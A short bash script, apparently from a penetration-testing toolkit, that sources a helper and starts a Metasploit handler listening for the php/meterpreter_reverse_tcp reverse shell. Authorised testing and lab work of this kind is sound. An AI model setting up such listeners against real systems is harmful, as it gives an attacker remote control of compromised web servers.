#!/bin/bash

: '
meterpreter: start meterpreter listener php/meterpreter_reverse_tcp
'

source ${SCRIPTS_DIR}/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh

PAYLOAD="php/meterpreter_reverse_tcp"

create_meterpreter_multi_handler "${PAYLOAD}"
